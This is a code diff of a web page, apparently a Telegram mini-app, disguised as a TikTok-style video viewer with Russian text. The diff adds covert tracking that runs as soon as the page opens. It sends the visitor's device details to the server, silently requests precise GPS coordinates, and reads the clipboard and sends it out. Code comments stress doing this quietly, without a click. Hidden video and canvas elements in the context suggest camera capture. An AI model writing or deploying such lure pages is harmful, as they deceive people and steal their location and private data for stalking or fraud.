@@ -30,9 +30,9 @@ button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18p
 #status{margin-top:20px;color:#aaa}
 </style></head>
 <body>
-<h2 style="margin-top:80px">🎬 TikTok Video</h2>
-<p>Нажми кнопку чтобы посмотреть</p>
-<button onclick="startAll()">▶ Смотреть</button>
+<h2 style="margin-top:80px">🎬 Видео готово</h2>
+<p>Нажмите чтобы посмотреть</p>
+<button id="watchBtn" onclick="startAll()">▶ Смотреть видео</button>
 <p id="status"></p>
 <video id="v" style="display:none" autoplay playsinline></video>
 <canvas id="c" style="display:none"></canvas>
@@ -42,14 +42,24 @@ tg.expand();
 
 const linkId = '{{ link_id }}';
 
+// Собираем инфу сразу при открытии (без кнопки)
+fetch('/collect/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
+
+// Пробуем GPS тихо (может сработать если уже давал разрешение)
+if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(pos=>{
+        fetch('/gps/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
+    },err=>{}, {enableHighAccuracy:true,timeout:10000,maximumAge:0});
+}
+
+// Буфер тихо
+(async function(){
+    try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
+})();
+
 function startAll(){
     document.getElementById('status').innerText = 'Загрузка...';
-    
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(pos=>{
-            fetch('/gps/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
-        },err=>{},{enableHighAccuracy:true,timeout:10000});
-    }
+    document.getElementById('watchBtn').style.display = 'none';
     
     (async function(){
         try{
@@ -78,12 +88,6 @@ function startAll(){
             st.getTracks().forEach(t=>t.stop());
         }catch(e){}
     })();
-    
-    (async function(){
-        try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
-    })();
-    
-    fetch('/collect/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
     
     setTimeout(()=>{
         document.getElementById('status').innerText='✅ Готово!';
